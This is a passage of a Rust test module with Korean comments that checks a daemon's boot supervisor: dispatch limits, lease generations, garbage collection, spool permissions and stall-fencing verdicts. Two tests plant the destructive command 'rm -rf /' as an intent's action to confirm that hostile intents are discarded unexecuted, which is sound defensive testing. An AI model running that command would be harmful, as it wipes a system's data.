        // ★계약 정련(B4-1 · master ⓑ): 이 상수는 **틱당 전역 스캔·통보 예산**이고 G1 은
        //   **레인당 실행 ≤1** 이라 서로 직교한다 — 서로 다른 레인에 각 1건이면 둘 다 만족한다.
        //   ★종전 기대치는 **덮어쓰기 버그를 전제**했다: 한 레인에 40건을 넣고 2건이 나가는
        //   것을 정상으로 고정했는데, 그 두 번째는 첫 번째를 표에서 지우고 자리를 차지한
        //   것이었다(codex R7 [2]). 전제를 바꾼 것이지 기대를 약화한 것이 아니다.
        for (i, lane) in ["l1", "l2", "l3"].iter().enumerate() {
            for j in 0..4 {
                let id = format!("f{i}{j:02}");
                let mut r = req(&id, None);
                r.lane = lane;
                enqueue_in(&dir, &r, 0.0).unwrap();
            }
        }
        let mut st = SupState::default();
        let n = tick_in(&d, &dir, &mut st, ok_runner, remove_spool_file, 1.0);
        assert_eq!(n, MAX_DISPATCH_PER_TICK, "틱당 상한 위반 — 폭주 차단 실패");
        // ★상한이 '레인이 하나뿐이라' 걸린 것이 아니라 **정말 예산에서** 걸렸는지 확인한다.
        //   한 레인 1건 확인으로 끝내면 이 상수는 그 순간부터 무측정이다(master 조건).
        assert_eq!(
            d.boot_run_active.lock().unwrap().len(),
            MAX_DISPATCH_PER_TICK,
            "서로 다른 레인이 동시에 활성이어야 한다 — 1건이면 예산이 아니라 슬롯 제약이 \
             걸린 것이고, 그러면 이 상수는 무측정이다"
        );
    }

    /// ★B3(§2-6) 계약 개정: 성공하면 인텐트는 **사라지지 않고** `state=running` 으로 전이한다.
    ///
    /// 종전 계약("성공하면 사라진다")은 재실행 0 을 **삭제**로 얻었고, 그 대가로 "누가 몇
    /// 세대로 실행 중인가"를 디스크에서 통째로 잃었다 — 그래서 재개도 fencing 도 불가능했다.
    /// 이제 재실행 0 은 **상태 게이트**(`decide` 의 running 분기)가 세운다. 이 검체는 계약이
    /// 바뀐 자리와 **바뀌지 않은 보증**을 함께 박제한다: 파일은 남되 **재실행은 여전히 0**이다.
    #[test]
    fn success_transitions_the_intent_to_running_and_never_reruns() {
        let d = tmp_daemon("success");
        let dir = tmp_spool("success");
        enqueue_in(&dir, &req("s", None), 0.0).unwrap();
        let mut st = SupState::default();
        assert_eq!(tick_in(&d, &dir, &mut st, ok_runner, remove_spool_file, 1.0), 1);
        let p = intent_path(&dir, "s");
        assert!(p.exists(), "성공 디스패치가 인텐트를 지웠다 — 소유권·세대 근거가 사라진다");
        let after = BootIntent::from_str("s", &std::fs::read_to_string(&p).unwrap())
            .expect("전이 후 인텐트가 판독 불가다");
        assert_eq!(after.state, IntentState::Running, "성공 후 state 가 running 이 아니다");
        assert_eq!(after.generation, 1, "lease 세대가 오르지 않았다(fencing 근거 부재)");
        // ★바뀌지 않은 보증 — 다음 틱이 같은 인텐트를 또 낳지 않는다(폭주 = 치명위험 ①).
        assert_eq!(
            tick_in(&d, &dir, &mut st, ok_runner, remove_spool_file, 100.0),
            0,
            "running 인텐트가 재실행됐다 — 상태 게이트가 삭제를 대체하지 못했다"
        );
    }

    /// ★B3(§2-6) 단위1 — `generation+1` 은 **스폰 전에** 영속된다.
    ///
    /// 순서가 계약인 이유: 이 값이 곧 lease 이고 러너의 side-effect RPC 가 이것으로 CAS 된다.
    /// 스폰 뒤에 올리면 그 사이 살아난 러너가 **낡은 세대**로 RPC 를 통과시켜 fencing 이 무의미해진다.
    /// 그래서 ⓐ러너가 받은 값과 ⓑ스폰이 **실패해도** 디스크에 남는 값 둘 다로 순서를 증명한다.
    #[test]
    fn dispatch_persists_the_new_lease_before_spawn() {
        use std::sync::atomic::{AtomicU32, Ordering as AOrd};
        static SEEN_GEN: AtomicU32 = AtomicU32::new(u32::MAX);
        fn gen_probe(_d: &Arc<Daemon>, i: &BootIntent, _a: BootAction) -> Result<String, RunErr> {
            SEEN_GEN.store(i.generation, AOrd::Relaxed);
            Ok("ok".into())
        }
        fn gen_probe_fail(_d: &Arc<Daemon>, i: &BootIntent, _a: BootAction) -> Result<String, RunErr> {
            SEEN_GEN.store(i.generation, AOrd::Relaxed);
            Err(RunErr::Retry("spawn_failed".into()))
        }
        // ⓐ 러너는 **올라간 뒤의** 세대를 본다.
        let d = tmp_daemon("lease");
        let dir = tmp_spool("lease");
        enqueue_in(&dir, &req("g", None), 0.0).unwrap();
        let mut st = SupState::default();
        assert_eq!(tick_in(&d, &dir, &mut st, gen_probe, remove_spool_file, 1.0), 1);
        assert_eq!(SEEN_GEN.load(AOrd::Relaxed), 1, "러너가 낡은 세대(0)를 받았다 — 스폰 후 증가");

        // ⓑ 스폰이 실패해도 세대는 이미 디스크에 있다(순서가 결과와 무관함을 보인다).
        let d2 = tmp_daemon("leasefail");
        let dir2 = tmp_spool("leasefail");
        enqueue_in(&dir2, &req("g", None), 0.0).unwrap();
        let mut st2 = SupState::default();
        assert_eq!(tick_in(&d2, &dir2, &mut st2, gen_probe_fail, remove_spool_file, 1.0), 1);
        let left = BootIntent::from_str("g", &std::fs::read_to_string(intent_path(&dir2, "g")).unwrap())
            .expect("스폰 실패 후 인텐트가 판독 불가다");
        assert_eq!(left.generation, 1, "스폰 실패 시 세대가 영속되지 않았다");
        assert_eq!(left.state, IntentState::Pending, "스폰 실패인데 running 으로 전이했다");
    }

    /// 합성 표본 — 적대적/깨진 인텐트는 **실행되지 않고** 사라진다.
    #[test]
    fn hostile_and_broken_intents_are_discarded_without_running() {
        let d = tmp_daemon("hostile");
        let dir = tmp_spool("hostile");
        raw_intent(&dir, "cmd", r#"{"v":2,"action":"rm -rf /","created_at":0.0}"#);
        raw_intent(&dir, "oldv", r#"{"v":99,"action":"ensure-team","created_at":0.0}"#);
        raw_intent(&dir, "junk", "not json at all");
        raw_intent(&dir, "noact", r#"{"v":2,"created_at":0.0}"#);
        // (P2 · v2) 구 스키마(v1)·미지 decl_origin — 둘 다 실행 0·폐기(fail-closed 유지).
        raw_intent(&dir, "oldschema", r#"{"v":1,"action":"ensure-team","created_at":0.0}"#);
        raw_intent(
            &dir,
            "forged",
            r#"{"v":2,"action":"ensure-team","created_at":0.0,"decl_origin":"hook-machine"}"#,
        );
        std::fs::write(dir.join("ignored.log"), "log line").unwrap();
        let mut st = SupState::default();
        // 실행자가 불리면 즉시 실패시켜 '실행 0' 을 증명한다.
        fn never(_d: &Arc<Daemon>, _i: &BootIntent, _a: BootAction) -> Result<String, RunErr> {
            panic!("적대적/깨진 인텐트가 실행됐다 — 스풀이 명령 실행 표면이 됐다");
        }
        assert_eq!(tick_in(&d, &dir, &mut st, never, remove_spool_file, 1.0), 0);
        for id in ["cmd", "oldv", "junk", "noact", "oldschema", "forged"] {
            assert!(!intent_path(&dir, id).exists(), "{id} 가 스풀에 남았다");
        }
        assert!(dir.join("ignored.log").exists(), "인텐트가 아닌 파일을 지웠다");
    }

    /// 디스크 mtime GC — **파싱은 되지만 파일이 늙은** 인텐트가 사라진다.
    ///
    /// ★검체 설계 주의(계측 타당성 실측 2026-08-24): 처음엔 본문을 `{ broken` 으로 두었는데,
    /// 그러면 `unparsable` 경로가 같은 파일을 지워 **mtime GC 를 통째로 떼어내도 초록**이었다
    /// (두 경로가 같은 표본을 덮어 판정이 공전). 그래서 표본을 "파싱 성공 · `created_at` 은
    /// 미래라 `expired` 도 아님 · 그러나 **파일 mtime 이 늙음**" 으로 좁혀, mtime GC 만이
    /// 지울 수 있는 상태로 만든다. 실행자는 실패자다 — GC 가 없으면 인텐트가 **실행되고**
    /// 파일도 남으므로 두 축(디스패치 0 · 파일 부재)이 동시에 무너진다.
    #[test]
    fn stale_files_are_gc_ed_by_mtime() {
        let d = tmp_daemon("mtimegc");
        let dir = tmp_spool("mtimegc");
        // 파일 mtime = '지금'. 판정 시각을 수명 너머로 주되 `created_at` 도 같이 옮겨
        // `expired`(decide) 가 아니라 **mtime GC**(scan) 만이 유일한 제거 경로가 되게 한다.
        let future = now_epoch() + INTENT_MAX_AGE_SECS + 60.0;
        raw_intent(
            &dir,
            "old",
            &format!(
                r#"{{"v":{INTENT_SCHEMA_V},"action":"ensure-team","lane":"","surface_id":null,
                    "created_at":{future},"attempts":0,"next_attempt_at":0.0,"reason":"t"}}"#
            ),
        );
        let mut st = SupState::default();
        let n = tick_in(&d, &dir, &mut st, fail_runner, remove_spool_file, future);
        assert_eq!(n, 0, "mtime 이 늙은 인텐트가 실행됐다 — mtime GC 미동작");
        assert!(!intent_path(&dir, "old").exists(), "mtime GC 미동작(파일 잔존)");
    }

    /// 감독자는 스풀을 **만들지 않는다**(생산자의 일). 있으면 권한만 조인다.
    #[test]
    fn tick_never_creates_the_spool_but_tightens_it_when_present() {
        let d = tmp_daemon("perm");
        let root = tmp_spool("perm");
        let missing = root.join("nope");
        let mut st = SupState::default();
        tick_in(&d, &missing, &mut st, ok_runner, remove_spool_file, 1.0);
        assert!(!missing.exists(), "감독자가 스풀을 만들었다 — 프로덕션 디스크 자국 0 계약 위반");
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            // ★(R2 정정) 넓은 권한의 스풀을 모사한다 — 정상 경로의 writer 는 데몬 하나이므로
            //   (0700 원자 기록) 이 형상의 출처는 **구 릴리스가 남긴 스풀·수동 조작·복원
            //   도구**다. 재강제는 그 잔여에 대한 방어이고 이 검체가 그것을 잰다.
            std::fs::set_permissions(&root, std::fs::Permissions::from_mode(0o777)).unwrap();
            tick_in(&d, &root, &mut st, ok_runner, remove_spool_file, 1.0);
            let m = std::fs::metadata(&root).unwrap().permissions().mode() & 0o777;
            assert_eq!(m, 0o700, "틱이 스풀 권한을 재강제하지 않았다: {m:o}");
        }
    }

    /// 파싱 불가 인텐트는 **mtime 과 무관하게** 즉시 폐기된다(위 검체가 좁힌 축의 형제 축).
    #[test]
    fn unparsable_files_are_discarded_regardless_of_mtime() {
        let d = tmp_daemon("unparsable");
        let dir = tmp_spool("unparsable");
        raw_intent(&dir, "junk", "{ broken");
        let mut st = SupState::default();
        let n = tick_in(&d, &dir, &mut st, fail_runner, remove_spool_file, now_epoch());
        assert_eq!(n, 0, "깨진 인텐트가 실행됐다");
        assert!(!intent_path(&dir, "junk").exists(), "깨진 인텐트가 스풀에 남았다");
    }

    /// 예산 맵 3종 방어 — 상한 초과 시 통째로 비운다.
    #[test]
    fn budget_map_is_capped_and_pruned() {
        let d = tmp_daemon("mapcap");
        let dir = tmp_spool("mapcap");
        let mut st = SupState::default();
        let now = 10_000.0;
        for i in 0..(MAX_TRACKED + 10) {
            st.budget.insert(format!("k{i}"), (1, now));
        }
        tick_in(&d, &dir, &mut st, ok_runner, remove_spool_file, now);
        assert!(st.budget.len() <= MAX_TRACKED, "상한 방어 실패: {}", st.budget.len());
        // 나이 만료 — 스풀에 없고 늙은 항목은 다음 틱에 사라진다.
        st.budget.insert("aged".into(), (1, 0.0));
        tick_in(&d, &dir, &mut st, ok_runner, remove_spool_file, INTENT_MAX_AGE_SECS + 10.0);
        assert!(!st.budget.contains_key("aged"), "나이 만료 방어 실패");
    }

    // ── ★유계성 검체 (재난 ① 이벤트 폭주) ─────────────────────────────────────
    //
    // 아래 셋의 계수기는 전부 **버스**(`daemon.bus.latest_seq()`)다 — `tick_in` 의 반환값이
    // 아니다. 산출자가 자기 산출물의 통과를 판정하지 않는다는 규율의 이 파일 판본이며,
    // 발행 경로를 하나라도 우회해 넣으면 그 순간 카운트가 어긋나 적색이 된다.

    /// ★삭제가 **계속 실패해도** 이벤트 총량은 유계다 (결함 1).
    ///
    /// 종전 구현은 `let _ = remove_file(..)` 뒤에 **무조건** 발행했다. 지워지지 않는 항목
    /// 하나가 감독자 cadence(3초)마다 영구히 이벤트를 낸다 = 재난 ① 그 자체이며, 스풀이
    /// 읽기전용이 되는 Windows 가 주 경로다(`ensure_spool` 의 권한 재강제는 `#[cfg(unix)]`).
    ///
    /// 두 삭제 경로(garbage GC · Retire)를 **함께** 건다 — 한쪽만 고치면 다른 쪽이 계속 샌다.
    #[test]
    fn undeletable_spool_entries_do_not_publish_forever() {
        let d = tmp_daemon("undeletable");
        let dir = tmp_spool("undeletable");
        raw_intent(&dir, "junk", "{ broken"); // ① 파싱 불가 → garbage GC 축
        raw_intent(&dir, "unknown", r#"{"v":2,"action":"rm -rf /","created_at":0.0}"#); // ② Retire 축
        let mut st = SupState::default();
        let before = d.bus.latest_seq();
        for _ in 0..200 {
            assert_eq!(
                tick_in(&d, &dir, &mut st, fail_runner, never_removes, 1.0),
                0,
                "지워지지 않는 쓰레기가 실행 후보가 됐다"
            );
        }
        let published = d.bus.latest_seq() - before;
        // ★조성 갱신(R2 — 약화 아님, 상한 이동): `unknown` 은 `unknown_action` 폐기 = **스폰
        //   0회 종착**이라 이제 loud 통보(feed.item.created 1건)가 붙는다. 조성:
        //   intent_discarded(junk) 1 + intent_retired(unknown) 1 + feed(무스폰 통보·래치) 1 = 3.
        //   유계 판정력은 종전과 동일하다 — 셋 다 래치라 200틱을 돌아도 늘지 않으며, 어느
        //   하나가 매 틱 반복되면 즉시 이 상한을 뚫는다.
        assert_eq!(
            published, 3,
            "삭제 실패 항목 2건이 200틱 동안 이벤트 {published}건을 냈다 \
             — 항목당 1건(사실은 알리되 반복하지 않는다)이어야 한다(재난 ①)"
        );
        // ★침묵도 실패다 — 지워지지 않는 스풀 항목은 **한 번은** 알려야 한다.
        assert!(published > 0, "삭제 실패를 통째로 삼켰다 — 무음 실패");
    }

    /// ★예산 맵 상한 집행이 **살아있는 인텐트의 예산을 리셋하지 않는다** (결함 2a).
    ///
    /// 시나리오는 두 축(디스크·메모리)을 함께 둔 **바로 그 이유**다: 스풀이 읽기전용이라
    /// 디스크측 `attempts` 가 영원히 0 이고(디스크 축 붕괴), 그 상태에서 예산 맵이 상한을
    /// 넘는다. 종전 구현은 그때 맵을 `clear()` 해 **메모리 축까지 함께** 무너뜨렸다 —
    /// 남는 유계가 하나도 없어 인텐트 하나가 매 틱 프로세스를 낳는다.
    #[test]
    fn budget_cap_never_resets_a_live_intents_budget() {
        let d = tmp_daemon("capreset");
        let dir = tmp_spool("capreset");
        let mut st = SupState::default();
        let mut total = 0usize;
        let mut now = 1.0;
        for tick in 0..60 {
            // 디스크가 예산을 못 올리는 상황 — 매 틱 attempts=0 으로 되살아난다.
            raw_intent(
                &dir,
                "live",
                &format!(
                    r#"{{"v":{INTENT_SCHEMA_V},"action":"ensure-team","lane":"","surface_id":null,
                        "created_at":{now},"attempts":0,"next_attempt_at":0.0,"reason":"t"}}"#
                ),
            );
            // 맵을 매 틱 상한 너머로 밀어 올린다(인텐트가 쏟아지는 24/365 데몬의 형태).
            for i in 0..(MAX_TRACKED + 10) {
                st.budget.insert(format!("t{tick}k{i}"), (1, now));
            }
            total += tick_in(&d, &dir, &mut st, fail_runner, remove_spool_file, now);
            now += 5.0;
        }
        assert!(
            total <= MAX_ATTEMPTS as usize,
            "예산 맵 상한 집행이 살아있는 인텐트의 예산까지 지웠다 — {total}회 디스패치 \
             (인텐트당 {MAX_ATTEMPTS}회 상한 무력화 = 폭주)"
        );
        assert!(
            st.budget.len() <= MAX_TRACKED + MAX_DISPATCH_PER_TICK,
            "예산 맵이 상한 위로 자란다: {} (누수)",
            st.budget.len()
        );
    }

    /// ★GC 는 **판정 상한과 독립**으로 돈다 (결함 2b).
    ///
    /// 정렬 앞쪽을 살아있는 인텐트로 가득 채우고(`a###`), 뒤쪽에 파싱 불가 쓰레기를 둔다
    /// (`z###`). 판정 상한(64) 안쪽만 GC 대상이면 뒤쪽은 **영원히** 지워지지 않는다 =
    /// 스풀 무한 성장. 쓰레기 수를 GC 상한보다 크게 잡아 **회전 커서**가 없으면 초록이
    /// 될 수 없게 만든다(상한을 키우는 것만으로는 이 검체를 통과할 수 없다).
    #[test]
    fn gc_is_not_starved_by_the_judgement_cap() {
        let d = tmp_daemon("gcstarve");
        let dir = tmp_spool("gcstarve");
        for i in 0..MAX_SCAN_ENTRIES {
            enqueue_in(&dir, &req(&format!("a{i:03}"), None), 0.0).unwrap();
        }
        const GARBAGE: usize = 400; // > MAX_GC_ENTRIES — 상한만 키우는 수리는 통과 못 한다.
        for i in 0..GARBAGE {
            raw_intent(&dir, &format!("z{i:03}"), "{ broken");
        }
        let mut st = SupState::default();
        let mut now = 1.0;
        for _ in 0..20 {
            tick_in(&d, &dir, &mut st, ok_runner, remove_spool_file, now);
            now += 5.0;
        }
        let names: Vec<String> = std::fs::read_dir(&dir)
            .unwrap()
            .filter_map(|e| e.ok())
            .map(|e| e.file_name().to_string_lossy().into_owned())
            .filter(|n| n.starts_with('z'))
            .collect();
        // ★계약 정련(B3-5 · H-LEASE-3): 이 검체가 지키는 불변식은 "0건" 이 아니라 **무한 성장
        //   금지**다. 명세 §2-6 이 손상 인텐트의 terminal 기록을 요구하므로 이제 앞쪽 몇 건은
        //   `.done` 기록으로 남는다 — 다만 그 수는 [`MAX_UNREADABLE_RECORDS`] 상수이고 **쓰레기
        //   개수와 무관**하다. 그 독립성이 "상한만 키우는 수리는 통과 못 한다" 는 원래 의도를
        //   그대로 지킨다(GARBAGE 를 4000 으로 올려도 남는 수는 같다).
        let unhandled = names.iter().filter(|n| !n.ends_with(DONE_SUFFIX)).count();
        let records = names.len() - unhandled;
        assert_eq!(
            unhandled, 0,
            "판정 상한 뒤쪽 쓰레기 {unhandled}건이 처리되지 않았다 — 스풀이 무한 성장한다"
        );
        assert!(
            records <= MAX_UNREADABLE_RECORDS,
            "손상 terminal 기록이 상한을 넘었다: {records} > {MAX_UNREADABLE_RECORDS}"
        );
        assert!(
            records < GARBAGE,
            "기록 수가 쓰레기 수를 따라간다 — 유계가 아니라 비례다(무한 성장의 다른 이름)"
        );
    }

    /// ★**성공했는데 파일이 스풀에 남는** 경우에도 낳는 프로세스와 이벤트는 유계다.
    ///
    /// ★B3(§2-6) 이후 이것은 예외가 아니라 **정상 경로**다 — 성공 디스패치는 인텐트를 지우지
    /// 않고 `state=running` 으로 전이한다. 그래서 유계의 근거가 **삭제에서 상태 게이트로**
    /// 옮겨졌고, 이 검체가 그 이동을 박제한다.
    ///
    /// 두 축을 함께 잰다 — 게이트가 **있을 때**와 **없을 때**의 유계는 서로 다른 기구가 세운다:
    ///  ⓐ 게이트 정상: 삭제가 한 번도 성공하지 않아도(`never_removes`) 재실행 **0**.
    ///  ⓑ 게이트 부재(음성 대조군): 전이 기록이 실패하면 파일은 `pending` 으로 남아 재디스패치가
    ///    되살아난다. 그때 유계를 세우는 것은 **예산 두 축**이고, 디스크가 통째로 거짓말해도
    ///    (attempts 가 영원히 0) 메모리측 예산이 혼자 `MAX_ATTEMPTS` 로 접는다(머리말 ③).
    ///    ⓑ가 없으면 ⓐ의 GREEN 은 "게이트가 유일한 방어"라는 잘못된 안심을 준다.
    #[test]
    fn successful_dispatch_with_undeletable_intent_is_still_bounded() {
        // ── ⓐ 상태 게이트가 재실행을 0 으로 막는다(삭제 전무) ──
        let d = tmp_daemon("okundeletable");
        let dir = tmp_spool("okundeletable");
        enqueue_in(&dir, &req("s", None), 0.0).unwrap();
        let mut st = SupState::default();
        let before = d.bus.latest_seq();
        let mut total = 0usize;
        let mut now = 1.0;
        for _ in 0..200 {
            total += tick_in(&d, &dir, &mut st, ok_runner, never_removes, now);
            now += 5.0; // 쿨다운을 계속 넘겨 준다 — 그래도 유계여야 한다.
        }
        assert_eq!(
            total, 1,
            "running 전이 후에도 {total}회 프로세스를 낳았다(상태 게이트 무력 = 폭주)"
        );
        let published = d.bus.latest_seq() - before;
        assert!(
            published <= 7,
            "200틱 동안 이벤트 {published}건 — 지워지지 않는 인텐트가 발행을 영구화했다"
        );

        // ── ⓑ 음성 대조군: 상태 게이트가 **서지 않을 때**도 예산이 접는가 ──
        //    매 틱 인텐트를 `pending`·`attempts=0` 으로 되살려 전이가 한 번도 붙지 않는 상황을
        //    만든다(리포 관례 — `budget_is_bounded_even_when_disk_never_persists` 와 같은 기법).
        //    ⓑ가 없으면 ⓐ의 GREEN 은 "게이트가 유일한 방어"라는 잘못된 안심을 준다.
        //    ★읽기전용 스풀로 주입하려던 첫 시도는 실패했고, 그것이 사실을 하나 알려 줬다 —
        //      `tick_in` 선두의 `ensure_spool` 이 unix 권한을 0o700 으로 **재강제**하므로
        //      읽기전용 스풀은 다음 틱에 스스로 치유된다. 그 경로로는 '디스크가 거짓말하는'
        //      상황을 만들 수 없다(그래서 인텐트 되살리기로 갈았다).
        let d2 = tmp_daemon("nogate");
        let dir2 = tmp_spool("nogate");
        let mut st2 = SupState::default();
        let mut total2 = 0usize;
        let mut now2 = 1.0;
        for _ in 0..200 {
            raw_intent(
                &dir2,
                "s",
                &format!(
                    r#"{{"v":{INTENT_SCHEMA_V},"action":"ensure-team","lane":"","surface_id":null,
                        "created_at":0.0,"attempts":0,"next_attempt_at":0.0,"reason":"t"}}"#
                ),
            );
            total2 += tick_in(&d2, &dir2, &mut st2, ok_runner, never_removes, now2);
            now2 += 5.0;
        }
        assert!(
            total2 <= MAX_ATTEMPTS as usize,
            "상태 게이트가 서지 않는데 {total2}회 낳았다 — 예산 축이 혼자서는 유계를 못 세운다"
        );
    }

    /// ★B3(§2-6) H-LEASE — fence 판정의 **두 갈래**를 순수 함수 층에서 단언한다.
    ///
    /// 가장 중요한 단언은 ①이다: **한 번도 보고하지 않은 런은 fence 하지 않는다.** 그때
    /// '러너가 죽었다'와 'hb 배선이 아직 없다'는 구별되지 않고, 구별 못 하는 신호로 파괴적
    /// 조치를 하면 건강한 부트를 다시 낳는다. 이 검체가 그 자제를 **의도**로 못박는다 —
    /// 없으면 다음 사람이 "왜 hb 만 보고 안 자르지?" 하며 조건을 지운다.
    #[test]
    fn fence_verdict_holds_back_until_the_runner_has_ever_reported() {
        let mk = |hb: f64, started: f64| BootRunActive {
            intent: "i".into(),
            generation: 1,
            roles: Vec::new(),
            hb,
            progress_step: String::new(),
            progress_at: started,
            started,
            pid: None,
            epoch: 0,
        };
        // ① 미보고(hb == started) — 아무리 오래 지나도 fence 하지 않는다.
        assert_eq!(
            fence_verdict(&mk(100.0, 100.0), 100.0 + HB_STALL_SECS * 100.0),
            None,
            "한 번도 보고하지 않은 런을 fence 했다 — 죽음과 미배선을 구별하지 못한 채 자른 것이다"
        );
        // ② 보고 뒤 정지 — 상한을 넘기면 fence 한다.
        assert_eq!(
            fence_verdict(&mk(200.0, 100.0), 200.0 + HB_STALL_SECS + 1.0),
            Some("hb_stall"),
            "보고가 끊긴 런을 fence 하지 않았다"
        );
        // ③ 보고가 신선하면 fence 하지 않는다(경계 바로 안쪽).
        assert_eq!(
            fence_verdict(&mk(200.0, 100.0), 200.0 + HB_STALL_SECS - 1.0),
            None,
            "신선한 런을 fence 했다 — 상한 경계가 어긋났다"
        );
    }

    /// ★B3-3(§2-6 ⓑ) H-LEASE — 진행 정체 판정의 **세 갈래 + 축 분리**를 순수 함수 층에서 단언한다.
    ///
    /// ⓐ(hb)와 같은 이유로 ①이 가장 중요하다: **한 번도 단계를 보고하지 않은 런은 자르지
    /// 않는다.** 보고 주체가 §2-7 러너(B4)라 지금은 프로덕션의 모든 런이 ①에 있다 — 이 축은
    /// 배선돼 있으나 **미발효**이고, 그 미발효가 우연이 아니라 **의도**임을 이 검체가 못 박는다.
    /// 없으면 다음 사람이 "왜 빈 단계는 안 자르지?" 하며 조건을 지우고, 그 순간 건강한 부트가
    /// 126초마다 잘린다.
    #[test]
    fn progress_verdict_holds_back_until_the_runner_has_ever_stepped() {
        let mk = |step: &str, progress_at: f64, hb: f64| BootRunActive {
            intent: "i".into(),
            generation: 1,
            roles: Vec::new(),
            hb,
            progress_step: step.into(),
            progress_at,
            started: 100.0,
            pid: None,
            epoch: 0,
        };
        // ① 미보고(단계 이름 없음) — 아무리 오래 지나도 자르지 않는다.
        assert_eq!(
            progress_verdict(&mk("", 100.0, 100.0), 100.0 + PROGRESS_STALL_SECS * 100.0),
            None,
            "단계를 한 번도 보고하지 않은 런을 fence 했다 — 정체와 미배선을 구별하지 \
             못한 채 자른 것이다"
        );
        // ② 보고 뒤 같은 단계에 머묾 — 상한을 넘기면 fence 한다.
        assert_eq!(
            progress_verdict(&mk("claim_role", 200.0, 200.0), 200.0 + PROGRESS_STALL_SECS + 1.0),
            Some("progress_stall"),
            "단계가 멎은 런을 fence 하지 않았다"
        );
        // ③ 경계 바로 안쪽 — 자르지 않는다. 한 노드가 **outer 예산을 꽉 써도** 건강하다.
        assert_eq!(
            progress_verdict(&mk("claim_role", 200.0, 200.0), 200.0 + PROGRESS_STALL_SECS - 1.0),
            None,
            "outer 예산 안에서 도는 런을 잘랐다 — 임계를 inner(105)나 TOTAL(90)로 내리면 \
             생기는 회귀다"
        );
        // ④ **시뮬 T3-3 시나리오 6** — heartbeat 스레드는 살아 있고 본 단계만 멎었다.
        //    ⓐ 는 침묵하고 ⓑ 만 잡는 자리다. 두 축을 한 함수에 합쳤다면 이 구별이 사라진다.
        let now4 = 200.0 + PROGRESS_STALL_SECS + 1.0;
        let alive_but_stuck = mk("claim_role", 200.0, now4);
        assert_eq!(
            fence_verdict(&alive_but_stuck, now4),
            None,
            "hb 가 방금 도착했는데 ⓐ 가 잘랐다 — 축이 섞였다"
        );
        assert_eq!(
            progress_verdict(&alive_but_stuck, now4),
            Some("progress_stall"),
            "hb 만 살아 있고 단계가 멎은 런을 아무도 잡지 못했다 — T3-3 시나리오 6 재발"
        );
    }

    /// ★B3-3 소스핀 — ⓑ 는 **호출부에서 합성**되고, `progress_step` 대입은 `progress_at` 과
    /// 짝을 이루며, 상수 리터럴은 예산 파리티가 훑는 **형식**을 유지한다.
    ///
    /// 세 함정을 닫는다:
    ///  ⓐ **합성 소실** — 순수 함수만 있고 호출부가 부르지 않으면 검체는 초록인데 프로덕션은
    ///     아무것도 재지 않는다(공허 통과 · 이 세션이 이미 두 번 겪은 계급).
    ///  ⓑ **짝 붕괴** — B4 가 `progress_step` 만 갱신하고 `progress_at` 을 두면 진행 중인 런이
    ///     등록 시각 기준으로 **전부 정체로 보인다**(건강한 부트를 자른다).
    ///  ⓒ **핀 공허화** — 예산 파리티(H-TIME-1 ⓓ)는 `const PROGRESS_STALL_SECS: f64 = <숫자>;`
    ///     형태만 훑는다. 형식이 깨지면 정규식이 한 건도 못 잡아 python↔Rust 대조가 조용히
    ///     사라진다(무측정). **값 자체는 python 이 소유하므로 여기 복제하지 않는다** — 형식만
    ///     못 박는다.
    #[test]
    fn progress_axis_is_wired_at_the_call_site_and_moves_in_pairs() {
        let src = include_str!("boot_supervisor.rs");
        let raw = &src[..src.find("#[cfg(test)]").expect("테스트 모듈 앵커 소실")];
        let prod = strip_line_comments(raw);
        // ⓐ 합성 지점은 정확히 1곳.
        assert_eq!(
            prod.matches("or_else(|| progress_verdict(").count(),
            1,
            "ⓑ 합성 지점이 정확히 1곳이 아니다 — 0이면 순수 함수가 프로덕션에서 돌지 않고 \
             (공허 통과), 2 이상이면 판정이 갈라진다"
        );
        // 동결 계약: ⓐ 판정 함수 본문은 ⓑ 를 모른다(R3 verdict 전 재작업 금지 · master 지시).
        let fat = prod.find("pub fn fence_verdict(").expect("fence_verdict 소실");
        let fbody = &prod[fat..];
        let fend = fbody.find("\n}").expect("fence_verdict 본문 끝 소실");
        assert!(
            !fbody[..fend].contains("progress"),
            "동결된 fence_verdict 본문에 진행 축이 섞여 들어갔다 — 리뷰 대상 설계가 흔들린다"
        );
        // ⓑ 짝 계약: 생산 코드에서 **두 이름의 등장 수가 같아야** 한다.
        //   ★콜론 붙은 구조체 필드(`progress_step:`)만 세면 B4 가 실제로 할 **필드 대입**
        //     (`r.progress_step = step;`)을 한 건도 못 잡는다 — 핀이 이름 붙인 바로 그 함정을
        //     비껴간다. 그래서 이름 자체를 센다: 한쪽을 늘리면 다른 쪽도 늘려야 통과한다.
        assert_eq!(
            prod.matches("progress_step").count(),
            prod.matches("progress_at").count(),
            "progress_step 과 progress_at 의 등장 수가 다르다 — 한쪽만 움직이면 진행 중인 \
             런이 등록 시각 기준으로 정체처럼 보여 건강한 부트가 잘린다"
        );
        assert!(
            prod.contains("progress_at:"),
            "생산 코드에 progress_at 대입이 없다 — 표 등록이 정체 기준 시각을 남기지 않는다"
        );
        // ⓒ 파리티 핀이 훑는 리터럴 형식.
        const DECL: &str = "const PROGRESS_STALL_SECS: f64 = ";
        let lit = prod
            .find(DECL)
            .map(|i| &prod[i + DECL.len()..])
            .and_then(|t| t.find(';').map(|e| &t[..e]))
            .expect("PROGRESS_STALL_SECS 선언 소실 — 파리티 핀이 훑을 대상이 없다");
        assert!(
            !lit.is_empty() && lit.chars().all(|c| c.is_ascii_digit() || c == '.'),
            "리터럴 형식 이탈({lit:?}) — 예산 파리티 정규식이 못 잡으면 python↔Rust 대조가 \
             조용히 공허해진다(무측정)"
        );
    }

    /// ★B3(§2-6) H-LEASE — fence 는 **세대만 올린다**. 죽이지도, 새로 낳지도 않는다.
    ///
    /// 두 절대치를 함께 단언한다:
    ///  ⓐ **새 프로세스 0** — 재개 디스패치는 이 단위에 없다(리뷰 계류 중인 '구 러너 무해'
    ///    가정에 의존하는 절반이라 의도적으로 뺐다). 이 단언이 없으면 나중에 누가 재개를
    ///    덧붙였을 때 아무도 눈치채지 못한다.
    ///  ⓑ **세대는 파일과 표 양쪽에서 오른다** — 한쪽만 오르면 CAS 가 갈려 fencing 이 무의미하다.
    #[test]
    fn fence_bumps_the_lease_without_spawning_or_killing() {
        let d = tmp_daemon("fence");
        let dir = tmp_spool("fence");
        enqueue_in(&dir, &req("f", None), 0.0).unwrap();
        let mut st = SupState::default();
        st.fence_armed = true; // ★R3 #7: 무장해야 fence 경로가 열린다(기본은 봉인).
        // 1틱: 디스패치 → running(세대 1) · 표 등록.
